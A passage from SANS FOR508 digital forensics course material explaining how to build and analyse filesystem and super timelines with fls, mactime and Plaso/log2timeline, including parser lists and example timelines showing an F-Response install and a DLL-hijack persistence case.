can also be run against live filesystems, making it potentially useful in various live triage acquisition scenarios.
Usage: fls [options] image [inode]
[Useful Options for fls]
-d: Display deleted entries only
-r: Recurse on directories
-p: Display full path when recursing
-m: Display in timeline bodyfile format
-s <sec>: Timeskew correction for system in seconds

© 2023 SANS Institute

.

45

Create Triage Timeline Step 2: mactime
mactime [options] –d -b bodyfile -z timezone > timeline.csv
[Useful Options for mactime]
-b:
-y:
-z:
-d:

Bodyfile location (data file)
Dates are displayed in ISO 8601 format
Specify the time zone (see time zone chart)
Comma-delimited format
Optional: Date Range (yyyy-mm-dd..yyyy-mm-dd)
Example: 2020-01-01..2020-6-01

• The mactime tool is a Perl script that takes bodyfile formatted files as input
• It can be given a date range to restrict itself or it can cover the entire time range
• “-z” is the output time zone to use. We highly recommend standardizing on UTC
to match other artifacts and eliminate time zone and daylight savings challenges
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Creating filesystem timelines is a simple two-step process. Once you have a bodyfile containing all the file
system metadata (output from either fls or MFTECmd), you simply need a tool to make the data humanreadable and sort chronologically. mactime is the tool within The Sleuth Kit (TSK) suite that performs this
function.

.

The mactime tool takes a bodyfile as input and parses the file to present it into a format that can easily be
analyzed by an investigator. You have multiple options available for using mactime. At a minimum, you need
to provide mactime with the location of the bodyfile with the –b option. The other options allow the
investigator some flexibility when working with the resultant data. For example, if you would like to import the
data into a spreadsheet or populate a database, you can opt to skip the tabulated (default) format and output in a
comma-delimited format (-d). CSV format is what we will use in this class as it can easily be imported into
multiple tools and provides a scalability and usefulness for future applications. Timestamps in Windows NTFS
are natively stored in UTC format, and we highly recommend standardizing on UTC to match other artifacts and
eliminate time zone and daylight savings challenges. However, mactime is an example of a tool which will
attempt to convert your timestamps to your local forensic workstation time by default. To prevent this time
conversion, use “-z UTC” to keep timestamps in their native UTC format. Finally, you can provide mactime a
date range to limit your result set. Without the optional date range argument, the mactime tool will output the
entire dataset from beginning to end.
mactime [options] –d -b bodyfile -z timezone > timeline.csv
[Useful Options for mactime]
-b:
-y:
-z:
-d:

Bodyfile location (data file)
Dates are displayed in ISO 8601 format
Specify the time zone (see time zone chart)
Comma-delimited format
Optional: Date Range (yyyy-mm-dd..yyyy-mm-dd)
Example: 2020-01-01..2020-6-01

46

© 2023 SANS Institute

.

46

Lab 4.2
Filesystem Timeline Creation and Analysis
Average Time: 40 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

47

.

This page intentionally left blank.

© 2023 SANS Institute

.

47

Timeline Analysis Agenda

Timeline Analysis Overview
Filesystem Timeline Creation and Analysis
Introducing the Super Timeline
Targeted Super Timeline Creation
Filtering the Super Timeline
Super Timeline Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

48

© 2023 SANS Institute

.

48

The Super Timeline w/ Plaso
and log2timeline.py

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

49

.

Special thanks to Rob Lee, Kristinn Gudjonsson, and Elizabeth Schweinsberg for their guidance on this section
and the imagination and foresight to bring super timelining to the masses.

© 2023 SANS Institute

.

49

Automated Forensics: Super Timelining

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

This is an example of a (partial) super timeline. You might immediately feel overwhelmed at the amount of
information presented. Don’t panic! By the end of this section, you will be creating and analyzing super
timelines with ease.

.

Read the contents of the “Source Description” column. You should notice a much greater diversity of artifacts
than previously seen in the file system timeline. There are entries from the filesystem (Bodyfile / $MFT),
browser history, LNK files, Windows registry keys, Prefetch, and more.
Do a quick review of the timeline. Can you see anything that immediately sticks out?
1.

It looks like a PDF was downloaded using a Chrome browser by the tdungan user.

2.

A PDF file was deleted (Recycled).

3.

FOXITPDFREADER was executed.

4.

The downloaded PDF was opened.

We could extract even more information from this set of artifacts, but this is a good start. With more of the
timeline, we could profile even more of the user’s activities. Stay tuned!

50

© 2023 SANS Institute

.

50

.
© 2023 SANS Institute

.

51

Example:
Program
Installation

Administrative
Share Mapped
(EID 5140,
4624, 4672)

File Copy:

File Execution:

subject_srv.exe

subject_srv.exe

New Service

New Driver:

Account Logoff

Imagepath =
subject_srv.exe

Mnemosyne.sys

cbarton-a

(EID 7045/4697)

(EID 4634)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Timeline forensics can result in output like the above with a little work on behalf of the investigator. The
amount of information can be overwhelming, but if examined properly, super timelines can show what
happened on a device second by second. Our forensic knowledge of the filesystem, operating system artifacts,
system logs, and registry data combined with a chronological timeline can paint a clear and articulate picture of
a subject’s activities — even if anti-forensics techniques are employed.
In this case, the execution of SUBJECT_SRV.EXE caught our attention. It seems like an unusual executable
name, and by looking at the entries around it, we can confirm (or refute) our suspicions.
1. An administrator share mapped (EID 5140) using an administrator-level account (EIDs 4624 and 4672). The
share name (C$) and logon information are included in the Long Description field, but not seen on this slide.
2. File copy: C:/Windows/subject_srv.exe. Notice the “m” time for the executable is not present and, in this
case, would be earlier in the timeline because copied files inherit their modification times from the source
file.
3. File execution indicated by Prefetch: subject_srv.exe
4. New service creation (EIDs 7045 and 4697): Imagepath = subject_srv.exe
5. Driver creation: C:/Windows/Mnemosyne.sys
6. Logoff (EID 4634): user account cbarton-a
Notice the timing of these events. This is a significant amount of activity to occur in ten seconds! We might
hypothesize these events were scripted or automated as it is unlikely a user could manually accomplish all of
this within that time period. It turns out this is evidence of the remote security tool F-Response being installed
(you can see the name of the service is “F-Response Subject” in one of the registry keys modified).
Interestingly, this is also identical to what some malware/ransomware installation looks like, even down to
dropping a new driver used to set up a rootkit or get kernel level access! It can be shocking how close security
tool artifacts can mimic those of malware.

52

© 2023 SANS Institute

.

52

.
© 2023 SANS Institute

.

53

Example Super Timeline: Malware Persistence

Successful
Admin Logon
(EID 4624
Logon Type 3)

File Execution:
cmd.exe
(two times)

PowerShell
Script Block
Logs Showing
File Copy

PowerShell
Transcript Log
for user spsql

File Copied:

File Copied:

SystemSettings
.dll

SystemSettings
.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Here is a different example: the pivot points drawing us to this timeline were the multiple executions of
cmd.exe. By looking before and after the points of interest, we gain a much deeper understanding of what
occurred on the system: we have an over the network authentication event followed closely by multiple
executions of cmd.exe. Evidence of PowerShell artifacts hint it is likely involved, with a culmination of two
brand new system files (an .exe and .dll) copied to an unusual location (C:\Windows). In a little more detail:
1. A known compromised account logged in with administrator rights (EIDs 4624 and 4672). Logon
information is included in the Long Description field, but not seen on this slide.
2. Two cmd.exe processes were executed within approximately three minutes of one another.
3. PowerShell script block logging shows records files copied to the C:\Windows folder (you can see a tiny part
of this command in the event Long Description field).
4. A PowerShell transcript log is created for the spsql user (known to be compromised in this investigation).
The contents mirrors that seen in the script block logs.
5. The file SystemSettings.dll is copied to the C:\Windows folder. Notice the “m” time is not present and, in
this case, would be earlier in the timeline because copied files inherit their modification times from the
source file.
6. The file SystemSettings.exe is copied to the C:\Windows folder.
It might not be readily understandable what is happening in this mini-timeline, but we would probably all agree
it does not look normal. New executables arriving in a system folder at the same time of PowerShell execution
makes this a very interesting pivot point! Analysis showed the .exe file was copied from C:\Windows\System32
and was legitimate. The .dll was malicious and the two located in the same folder together created a DLL hijack.
A persistence mechanism was subsequently set up by the attackers to point at C:\Windows\SystemSettings.exe,
which both looks legitimate and has a verified digital signature from Microsoft! However, upon execution, the
malicious .dll was loaded, starting the attacker long-term backdoor. While not pointed out above, the execution
of rundll.exe within a second of the other important actions would also make it worth digging deeper into. It
could be coincidental as it is a legitimate system process, but we also know it is a commonly abused living off
the land binary. Further analysis showed this attack to be even more interesting than first imagined. The
rundll32.exe execution was a sacrificial process used by an installed Cobalt Strike beacon backdoor. The evil
actions seen in this part of the timeline were all proxied through Cobalt Strike.
54

© 2023 SANS Institute

.

54

.
© 2023 SANS Institute

.

55

Introducing Plaso and log2timeline.py

Collect Time-Based Events from Mac, Linux, and Windows

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Log2timeline was created by Kristinn Guðjónsson as a part of a discussion for his GCFA Gold Certification here
at SANS. Prompted by SANS Faculty Fellow Rob Lee for a need to compile a variety of time information into a
single file, Kristinn felt a single tool with a variety of options was probably the best bet. What he created was
far better and more important than anyone in the forensic community might have imagined. Kristinn’s project is
incredibly important to the forensic community, as it is the only tool to help parse many of these artifacts, so an
investigator has a single point of reference for their case. Kristinn is continually updating this project, so if you
have any comments or suggestions, please contribute!
Plaso (plaso langar að safna öllu) is the Python-based backend engine now used for creation of super timelines.
We will use the terms Plaso and log2timeline interchangeably throughout this section.
Important Components of Plaso
log2timeline: This is the main single-machine frontend to the Plaso backend. This is the tool that can be used to
extract events from a group of files, mount point, or a forensic image and save the results in a Plaso storage file
for future processing and analysis.
pinfo: The plaso storage file contains a variety of information about how and when the collection took place. It
may also contain information from any preprocessing stages that were employed. pinfo is a simple tool designed
to print out this information from a storage database file.
psort: The post-processing tool used to filter, sort, and process the plaso storage file. This tool is used for all
post-processing filtering, sorting, and tagging of the storage file. Because the Plaso storage format is not in
human-readable format, it is typically necessary to run this tool on the storage file to create useful output.

56

© 2023 SANS Institute

.

56

Plaso Windows Parsers
Chrome

Esedb

EVT /
EVTX

Filestat

Firefox

Google
Drive

IE 6–9

IE/Edge
Webcache

Chromiumbased Edge

IIS

Job Files

Jumplists

LNK

Olecf

OneDrive
Logs

Portable
Executables

PowerShell
Transcription

Prefetch

Recycle Bin

Registry

Skype

Skydrive

Windows

Logs

Defender
History

Winfirewall

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

57

.

Plaso/Log2timeline was initially built to scan and extract logs and time-related artifacts from Windows
operating systems. It extracts a wealth of information the registry, browser history, shell items, prefetch, and
more. These artifacts often make up nearly 99% of the forensic data an investigator needs during an
investigation. The power of Log2timeline is in its ability to normalize all of these disparate data sources into
one consistent view for the investigator. Bringing many artifacts together in the same view facilitates
interpretation and leads to rapid understanding of events that occurred on the system.
Windows Parsers
bencode: Parser for bencoded files.
bencode_transmission: Parser for Transmission bencoded files.
bencode_utorrent: Parser for uTorrent bencoded files.
custom_destinations: Parser for *.customDestinations-ms files.
esedb: Parser for Extensible Storage Engine (ESE) database files.
filestat: Parser for filesystem stat information.
hachoir: Parser that wraps Hachoir.
lnk: Parser for Windows Shortcut (LNK) files.
mcafee_protection: Parser for McAfee AV Access Protection log files.
olecf_document_summary: Parser for a DocumentSummaryInformation OLECF stream.
olecf_summary: Parser for a SummaryInformation OLECF stream.
onedrive_log : Parser for OneDrive Log files.
openxml: Parser for OpenXML (OXML) files.
pe : Parser for Portable Executable (PE) files.
powershell_transcript : Parser for PowerShell transcript event.
prefetch: Parser for Windows Prefetch files.
recycle_bin: Parser for Windows $Recycle.Bin $I files.
skydrive_log: Parser for OneDrive (or SkyDrive) log files.
skydrive_log_error: Parser for OneDrive (or SkyDrive) error log files.
sqlite: Parser for SQLite database files.
symantec_scanlog: Parser for Symantec Anti-Virus log files.
winevt: Parser for Windows EventLog (EVT) files.
© 2023 SANS Institute

.

57

.

winevtx: Parser for Windows XML EventLog (EVTX) files.
windefender_history : Parser for Windows Defender scan DetectionHistory
winfirewall: Parser for Windows Firewall Log files.
winiis: Parser for Microsoft IIS log files.
winjob: Parser for Windows Scheduled Task job (or At-job) files.
winreg: Parser for Windows NT Registry (REGF) files.
google_drive: Parser for Google Drive SQLite database files.
skype: Parser for Skype SQLite database files.

58

© 2023 SANS Institute

.

Plaso Registry (winreg) Parsers
amcache

appcompat
cache

bagmru

bam

ccleaner

msie
zone

mountpoints2

mrulist

networks

officemru

outlook
mru

programcache

run &
runonce

sam_users

services

shutdown

task
scheduler

terminal
server

typedurls

usb

usbstor

userassist

winrar

winver

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

59

hi

de

One of the areas that Log2timeline/Plaso has excelled in is extraction from Windows registry hive files. Some of
the most evidentiary-rich artifacts are found in the Windows Registry files, especially the NTUSER.DAT hive.
Shellbag folder history, RecentDocs, and Open/SaveMRU lists account for much of the evidence of file opening
or folder opening that a user accomplished. Additions in the evidence of execution category include
appcompatcache, userassist, runmru, and others.
The combination of so many registry parsers/plugins makes Log2timeline/Plaso an excellent forensic tool to run
against Windows operating systems.
Registry Artifact Parsers:
amcache : Parser for AMCache (AMCache.hve).
appcompatcache : Parser for Application Compatibility Cache Registry data.
bagmru : Parser for BagMRU (or ShellBags) Registry data.
bam : Parser for Background Activity Moderator (BAM) Registry data.
ccleaner : Parser for CCleaner Registry data.
explorer_mountpoints2 : Parser for Windows Explorer mountpoints Registry data.
explorer_programscache : Parser for Windows Explorer Programs Cache Registry data.
microsoft_office_mru : Parser for Microsoft Office MRU Registry data.
microsoft_outlook_mru : Parser for Microsoft Outlook search MRU Registry data.
mrulist_shell_item_list : Parser for Most Recently Used (MRU) Registry data.
mrulist_string : Parser for Most Recently Used (MRU) Registry data.
mrulistex_shell_item_list : Parser for Most Recently Used (MRU) Registry data.
mrulistex_string : Parser for Most Recently Used (MRU) Registry data.
mrulistex_string_and_shell_item : Parser for Most Recently Used (MRU) Registry data.
mrulistex_string_and_shell_item_list : Parser for Most Recently Used (MRU) Registry data.
msie_zone : Parser for Microsoft Internet Explorer zone settings Registry data.
mstsc_rdp : Parser for Terminal Server Client Connection Registry data.
mstsc_rdp_mru : Parser for Terminal Server Client Most Recently Used (MRU) Registry data.
network_drives : Parser for Windows network drives Registry data.
© 2023 SANS Institute

.

59

.

networks : Parser for Windows networks (NetworkList) Registry data.
userassist : Parser for User Assist Registry data.
windows_boot_execute : Parser for Boot Execution Registry data.
windows_boot_verify : Parser for Windows boot verification Registry data.
windows_run : Parser for Run and run once Registry data.
windows_sam_users : Parser for Security Accounts Manager (SAM) users Registry data.
windows_services : Parser for Windows drivers and services Registry data.
windows_shutdown : Parser for Windows last shutdown Registry data.
windows_task_cache : Parser for Windows Task Scheduler cache Registry data.
windows_timezone : Parser for Windows time zone Registry data.
windows_typed_urls : Parser for Windows Explorer typed URLs Registry data.
windows_usb_devices : Parser for Windows USB device Registry data.
windows_usbstor_devices : Parser for Windows USB Plug And Play Manager USBStor Registry data.
windows_version : Parser for Windows version (product) Registry data.
winlogon : Parser for Windows log-on Registry data.
winrar_mru : Parser for WinRAR History Registry data.
winreg_default : Parser for Windows Registry data.

60

© 2023 SANS Institute

.

Plaso Webhistory (webhist) Parsers

Chrome cache

Chrome
cookies

Chrome
extension
activity

Chrome
history

Firefox cache

Firefox
cookies

Firefox
downloads

Firefox
history

Java idx

MS Index.dat

Chromiumbased Edge

MS
webcache.dat

Opera global

Opera typed
history

Safari history

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

61

Plaso/Log2timeline.py also has many new web history parsers in it. From older IE6-9 index.dat and cache
indexes, to the IE10/11 webcachev01.dat ESEDB files, to SQLite databases from Chrome, Firefox, Safari, and
Opera. Even Java IDX files, the index file associated with JAVA downloads, can be extracted and added to the
timeline.

.

Webhistory Parsers
chrome_cache: Parser for Chrome Cache files
chrome_cookies: Parser for Chrome cookies SQLite database files
chrome_extension_activity: Parser for Chrome extension activity SQLite database files
chrome_history: Parser for Chrome history SQLite database files
firefox_cache: Parser for Firefox Cache files
firefox_cookies: Parser for Firefox cookies SQLite database files
firefox_downloads: Parser for Firefox downloads SQLite database files
firefox_history: Parser for Firefox history SQLite database files
java_idx: Parser for Java IDX files
msiecf: Parser for MSIE Cache Files (MSIECF) also known as index.dat
msie_webcache: Parser for MSIE WebCache ESE database files
opera_global: Parser for Opera global_history.dat files
opera_typed_history: Parser for Opera typed_history.xml files

© 2023 SANS Institute

.

61

Plaso Linux/Android/Mac (android, linux, macosx)
Android
app usage

Android
calls

Android
sms

appusage

Asl log

bencode

Bsm log

Cups ipp

filestat

Google
drive

Ipod
device

Ls
quarantine

Firewall
log

Doc
versions

Mackeeper
cache

keychain

securityd

macwifi

olecf

openxml

Plist
airport

Plist
appleacco
unt

Plist
bluetooth

Plist
default

Plist
install
history

Plist
macuser

Plist
softwareup
date

Plist
spotlight

Plist
spotlight
volume

Plist
timemachi
ne

Pls recall

Popularity
contest

selinux

skype

syslog

utmp

utmpx

webhist

xchatlog

xchatscroll
back

Zeitgeist

mactime

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

de

The new version of log2timeline.py/plaso has many new parsers in it, expanding its reach onto other platforms.

hi

Linux / Android /Other
android_app_usage: Parser for the Android usage-history.xml file
android_calls: Parser for Android calls SQLite database files
android_sms: Parser for Android text messages SQLite database files
bencode: Parser for bencoded files
bencode_transmission: Parser for Transmission bencoded files
bencode_utorrent: Parser for uTorrent bencoded files
filestat: Parser for filesystem stat information
google_drive: Parser for Google Drive SQLite database files
openxml: Parser for OpenXML (OXML) files
pls_recall: Parser for PL-SQL Recall files
popularity_contest: Parser for popularity contest log files
selinux: Parser for SELinux audit log files
syslog: Parser for syslog files
skype: Parser for Skype SQLite database files
utmp: Parser for Linux/Unix UTMP files
utmpx: Parser for UTMPX files
xchatlog: Parser for XChat log files
xchatscrollback: Parser for XChat scrollback log files
zeitgeist: Parser for Zeitgeist activity SQLite database files
mactime: Parser for SleuthKit's mactime bodyfiles
pcap: Parser for PCAP files

62

© 2023 SANS Institute

.

62

.

Mac
appusage: Parser for Mac OS X application usage SQLite database files
asl_log: Parser for ASL log files
bencode: Parser for bencoded files
bencode_transmission: Parser for Transmission bencoded files
bencode_utorrent: Parser for uTorrent bencoded files
bsm_log: Parser for BSM log files
cups_ipp: Parser for CUPS IPP files
filestat: Parser for filesystem stat information
google_drive: Parser for Google Drive SQLite database files
ipod_device: Parser for iPod, iPad and iPhone plist files
ls_quarantine: Parser for LS quarantine events SQLite database files
mac_appfirewall_log: Parser for appfirewall.log files
mac_keychain: Parser for Mac OS X Keychain files
mac_securityd: Parser for Mac OS X securityd log files
macwifi: Parser for Mac OS X wifi.log files
mac_document_versions: Parser for document revisions SQLite database files
mackeeper_cache: Parser for MacKeeper Cache SQLite database files
olecf: Parser for OLE Compound Files (OLECF)
olecf_automatic_destinations: Parser for *.automaticDestinations-ms OLECF files
olecf_default: Parser for a generic OLECF item
olecf_document_summary: Parser for a DocumentSummaryInformation OLECF stream
olecf_summary: Parser for a SummaryInformation OLECF stream
openxml: Parser for OpenXML (OXML) files
plist_airport: Parser for Airport plist files
plist_appleaccount: Parser for Apple account information plist files
plist_bluetooth: Parser for Bluetooth plist files
plist_default: Parser for plist files
plist_install_history: Parser for installation history plist files
plist_macuser: Parser for Mac OS X user plist files
plist_softwareupdate: Parser for Mac OS X software update plist files
plist_spotlight: Parser for Spotlight plist files
plist_spotlight_volume: Parser for Spotlight volume configuration plist files
plist_timemachine: Parser for TimeMachine plist files
skype: Parser for Skype SQLite database files
webhist: All the Web History files
Other
mactime: Parser for common mactime (SleuthKit) bodyfile format
The mactime plugin converts traditional “body” file timeline output into a plaso database format file. This
allows tools that default to mactime format (such as the timeliner Volatility plugin) to be imported directly into a
Plaso database. The following command runs the parser “mactime” against a bodyfile and adds it directly into a
out.plaso database file. If the out.plaso file already exists, it will append to the database.
log2timeline.py --parsers “mactime” out.plaso bodyfile

© 2023 SANS Institute

.

63

log2timeline.py Usage
# log2timeline.py --storage-file [STORAGE FILE] [SOURCE]

Important Options:
--storage-file
[SOURCE]
--timezone <TZ>

--timezone list
--help

Plaso output database file – e.g:
/path/to/out.plaso
Device, image, or directory of files to be parsed – e.g.:
/path/to/image.E01
Define time zone of the system being investigated
(not the output). If a forensic image is provided (e.g.
E01, raw), the timezone is identified automatically

List available time zones
List all options with usage descriptions
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Because Plaso is really a backend parsing engine, it needs a frontend to be able to run as a standalone tool.
There are many possible frontends. The primary one is called log2timeline, which is the single-machine
frontend that takes care of processing data from files in a directory, mounted devices, forensic images, and
virtual disk images. When run against a collection of files in a directory, recursion is automatic, evaluating all
files through all subdirectories.
Given the power of the tool, running log2timeline can be quite simple. However, a few options need to be
understood for accurate parsing. We’ll also discuss additional options in the coming pages to help optimize
processing time. You can always see a full list of options by running “log2timeline.py --help”.
The two required options are (1) specifying a storage file and (2) specifying the source of data to parse. The
storage file is a database file that holds normalized parsed data resulting from log2timeline analysis of artifacts.
This is typically a new file created as a result of running log2timeline, but it’s also possible to re-run
log2timeline against additional data to add events to an existing database file. The source of data to parse is a
directory of files, a mount point, or an image file containing artifact files from the subject system.
Dealing with time zones is a painful but important part of forensic analysis and reporting. As such, we need to
understand how our forensic tools deal with them. In the case of Plaso, there are options for handling time
zones during the input stage and the output stage. Log2timeline is the input stage, and so the option “--timezone
<TZ>” is important to understand. This is the time zone of the computer being investigated (not the desired
output time zone). This is needed because some artifacts are stored in local time instead of UTC. Log2timeline
is aware of this, but it needs to know how much to adjust the local times for certain artifacts to be consistent
with the other artifacts it’s collecting that are stored in UTC. Note that if a forensic image or mounted device is
used as the source, log2timeline typically runs a preprocessor that collects the time zone information
automatically, and if discovered, that value will be used where applicable. When run against a collection of
files, including a triage image, the time zone should be included. A best practice is to not take chances and
specify the time zone of the subject system, especially if you know there are artifacts in the source files being
parsed which store times in local time. If time zone is not specified, and not detected, UTC is used for the
artifacts that are stored in local time. (Log2timeline always stores UTC-based artifacts in UTC.) To get a list of
available time zones, run “log2timeline.py --timezone list”.
64

© 2023 SANS Institute

.

64

A pro tip for validating proper local time adjustments for Windows hosts is to review the “setupapi” parsing
results. This parser is included in log2timeline’s Windows presets and is one of just a handful of Windows
artifacts that store times in local time. The good news for Windows analysis is the vast majority of artifacts are
stored in UTC by default.
Plaso is a powerful framework with a lot of options and features. For more details on the project, be sure to visit
the Plaso documentation site.[1]

.

[1] https://for508.com/j0cqb

© 2023 SANS Institute

.

65

log2timeline.py Target Examples
Raw Image

• log2timeline.py --storage-file out.plaso image.dd

EWF Image

• log2timeline.py --storage-file out.plaso image.E01

Virtual Disk Image

• log2timeline.py --storage-file out.plaso triage.vhdx

Physical Device
(mounted)

• log2timeline.py --storage-file out.plaso /dev/sdd

Volume via
Partition Num

• log2timeline.py –-partitions 2 --storage-file
out.plaso /path-to/image.dd

Triage Directory

• log2timeline.py --storage-file out.plaso /triage/dir/

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Log2timeline is an amazingly flexible tool. It can run against nearly any data source you have available. It
supports forensic images (raw “dd” and E01), virtual disk images (VMDK, VHD/X, and QCOW/2/3), mounted
devices (e.g., hard drive attached via a write-blocking device), individual volumes on a drive, and one of our
favorite use cases, parsing a collection of triage data. Imagine you only had a handful of event logs, the prefetch
folder, and a browser database exported from a subject system. You could point log2timeline at that collection
of files and create a timeline out of whatever artifacts you happen to have available. Awesome!
The following are examples of log2timeline parsing evidence in different formats:
Raw Image

log2timeline.py --storage-file /path-to/out.plaso /path-to/image.dd

EWF Image

log2timeline.py --storage-file /path-to/out.plaso /path-to/image.E01

Virtual Disk Image

log2timeline.py --storage-file /path-to/out.plaso /path-to/triage.vhdx

Physical Device (e.g., attached mounted drive, write-blocked drive, or remotely connected F-Response drive)
log2timeline.py --storage-file /path-to/out.plaso /dev/sdd

Volume via Partition Number(s) (i.e., from a full disk image, one or more partitions can be specified)

log2timeline.py –-partitions 2 --storage-file /path-to/out.plaso image.dd

Triage Folder

log2timeline.py --storage-file /path-to/out.plaso /triage/directory/

Note that when processing a disk image, it’s recommended to parse the image file directly rather than mount the
image to a mount point on the analysis system. There are several drawbacks of using a mount point, such as
differences in which files are exposed depending on the driver used to mount the disk image. For example, on an
NTFS image, the $MFT master file table may not be exposed for log2timeline to parse. Therefore, it’s generally
better to point log2timeline at the full disk image when an image is available. Note that image parsing is
provided via the Digital Forensics Virtual File System (dfVFS) toolset. Visit the dfVFS documentation site for
details on the latest storage media file types supported.[1]
[1] dfVFS documentation: https://for508.com/8vhmg
66

© 2023 SANS Institute

.

66

Timeline Analysis Agenda

Timeline Analysis Overview
Filesystem Timeline Creation and Analysis
Introducing the Super Timeline
Targeted Super Timeline Creation
Filtering the Super Timeline
Super Timeline Analysis
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

67

.

This page intentionally left blank.

© 2023 SANS Institute

.

67

Targeted Super Timeline
Creation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

68

© 2023 SANS Institute

.

68

Targeted Super Timeline Options

--parsers
-f <Filter File>
Triage Image
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

69

In the world of timeline analysis, analysts tend to split into two schools of thought: those who prefer an allinclusive super timeline and those that lean toward more targeted mini-timelines.

.

The all-inclusive or "kitchen sink" approach runs log2timeline against a disk image and extracts every
timestamp and artifact it supports. Filtering and analysis are then accomplished on the full dataset after
collection. This is what many people think of when they hear “super timeline.” Smaller timelines can always be
carved out of the larger set when necessary.
The second school of thought uses a more targeted acquisition of data, collecting data only from files relevant
for their needs. These analysts tend towards the more advanced features of log2timeline in combination with
other tools, such as one-off scripts and dedicated parsing tools. The advantage of targeted collection is speed.
An all-inclusive run of log2timeline against a large disk could easily take 12-24 hours to complete. A targeted
collection often requires between 5-30 minutes. The disadvantage of creating smaller targeted timelines is the
possibility of missing an important artifact. However, for most cases starting your analysis early is worth the
small risk, especially knowing you can usually go back and add artifacts as needed once you have a better
understanding of the case and data available. Log2timeline.py now ships with multiple features to facilitate
targeted timeline creation.
Parsers
--parsers PARSER_LIST
Log2timeline makes it easy to provide a specific list of parsers to use for timeline creation. This is a
straightforward way to limit scope, as only artifacts relevant to the chosen parsers will be analyzed and output.
Parsers can be specified by name directly on the command line using the --parsers option. To see the full list of
available parsers, run log2timeline with the “--parsers list” option.

© 2023 SANS Institute

.

69

Filter Files
-f FILTER_FILE, --file_filter FILTER_FILE, --file-filter FILTER_FILE
Instead of limiting artifact analysis by parser type, a filter file contains a list of specific files to find and parse. A
filter file contains one file path per line. While it might seem tedious to specify every file to parse, in practice it
turns out to be a relatively small list, aligning almost exactly with what one might collect with a triage image of
a system. And as we will see shortly, SANS has already created an excellent list for your use. This feature is
particularly fast and useful when you have a full disk to analyze and do not want to take the extra step of
creating a triage file collection first.

.

Using Triage Images
While technically not a feature of log2timeline, one of the easiest ways to reduce the scope of your timeline is to
point at a triage file collection instead of the entire disk. By definition, triage collection collects the files you
believe to be most vital to your investigation. Hence, it makes sense to create a timeline from those files and it
takes no additional work other than pointing log2timeline at the correct data source. This is the technique we
will employ in an upcoming lab.

70

© 2023 SANS Institute

.

log2timeline.py Parser Presets
log2timeline.py -–parsers “win7,!filestat” --storage-file out.plaso <target>
win_gen
winxp
win7

bencode, czip/oxml, esedb, filestat, gdrive_synclog, lnk, mcafee_protection, olecf, pe, prefetch,
s etupapi, sccm, skydrive_log, skydrive_log_old, google_drive, skype, symantec_scanlog,
u snjrnl, webhist, winfirewall, winjob, winreg
recycle_bin_info2, rplog, winevt, win_gen
a mcache, custom_destinations, esedb/file_history, olecf_automatic_destinations, recycle_bin,
w inevtx, win_gen

webhist

binary_cookies, chrome_cache, chrome_preferences, esedb/msie_webcache, firefox_cache, java_idx,
m siecf, opera_global, opera_typed_history, safari_history, chrome_8_history, chrome_17_cookie,
chrome_27_history, chrome_66_cookies, chrome_autofill, chrome_extension_activity,
firefox_cookies, firefox_downloads, firefox_history, safari_historydb

linux

apt_history, bash_history, bencode, czip/oxml, dockerjson, dpkg, filestat, gdrive_synclog,
googlelog, olecf, pls_recall, popularity_contest, selinux, google_drive, skype, zeitgeist, syslog,
systemd_journal, utmp, vsftpd, webhist, xchatlog, xchatscrollback, zsh_extended_history

macosx

a sl_log, bash_history, bencode, bsm_log, cups_ipp, czip/oxml, filestat, fseventsd, gdrive_synclog,
m ac_appfirewall_log, mac_keychain, mac_securityd, macwifi, olecf, plist, spotlight_storedb, appusage,
google_drive, imessage, ls_quarantine, mac_document_versions, mac_notes, mackeeper_cache,
mac_knowledgec, skype, syslog, utmpx, webhist, zsh_extended_history

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

71

.

Defining a list of parsers to use is the original way to speed up processing in log2timeline. Log2timeline now
provides several “preset” lists in the distribution. On the command-line, presets can be referenced in addition to
individual parsers using a comma-separated list. Parsers can be added to or excluded from the presets. For
example, a parser can be excluded from a preset by prepending the parser with an exclamation mark (!). In the
example on this slide, the “win7” preset list of parsers will be used, with the exception of the individual
“filestat” parser.
The slide also shows the list of parser presets available in log2timeline at the time of this writing. Perhaps
somewhat confusingly, the “win7” preset is relevant for all Windows systems from Vista and above (many
artifacts changed formats between XP and Windows Vista). Note that both “win7” and “winxp” reference
“win_gen”, which means they include that additional list of parsers, which are generally consistent across all
Windows versions.
To get the list of available parsers and presets on a given installation of log2timeline, use the “--parsers list”
option. You can also learn more about parsers, plugins, and presets from the Plaso’s developer
documentation.[1][2]
[1] How to write a parser: https://for508.com/i9k8v
[2] Parsers and plugins: https://for508.com/s0zjl

© 2023 SANS Institute

.

71

log2timeline.py Filter Files
log2timeline.py –f filter_windows.txt

• Filter files allow for targeted
analysis within large data sets
• Great for processing disk
images
• Two formats supported:
•
•

Legacy text-based
YAML-based

log2timeline.py –f filter_windows.yaml

• Both formats support:
•
•
•
•

Basic regular expressions
Wildcards
Path recursion
Path variables

• Only the YAML format
supports exclusion filters
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Filter files in log2timeline work by limiting the targeted set of input. The file defines the paths to files and paths
that should be parsed, ignoring the rest. This opens up the possibility of a fast method of extracting just the data
of interest, regardless of the data source. Filter files allow log2timeline to skip a majority of irrelevant files and
folders present in a filesystem. This speeds up processing by orders of magnitude and should be considered in
any situation in which an analyst quickly needs to answer questions about a system.
There are two supported formats for the filter file: the traditional text-based format and the newer YAML-based
format.
Text-based Filter Files
